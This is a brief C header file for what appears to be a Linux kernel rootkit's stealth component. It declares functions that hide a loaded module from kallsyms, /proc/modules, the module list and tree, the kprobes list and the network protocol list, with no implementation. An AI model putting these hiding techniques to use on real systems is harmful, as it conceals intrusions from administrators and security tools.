/* hide_module.h — 模块可见性隐藏接口 */
#ifndef _HIDE_MODULE_H_
#define _HIDE_MODULE_H_

int  kallsyms_hide_module(const char *modname);
void kallsyms_hide_cleanup(void);

int  proc_modules_hide_install(void);
void proc_modules_hide_cleanup(void);

int  module_list_hide(void);
void module_list_unhide(void);

int  mod_tree_hide_install(void);
void mod_tree_hide_cleanup(void);

int  kprobes_list_hide_install(void);
void kprobes_list_hide_cleanup(void);

int  net_protocols_hide_install(void);
void net_protocols_hide_cleanup(void);

#endif /* _HIDE_MODULE_H_ */
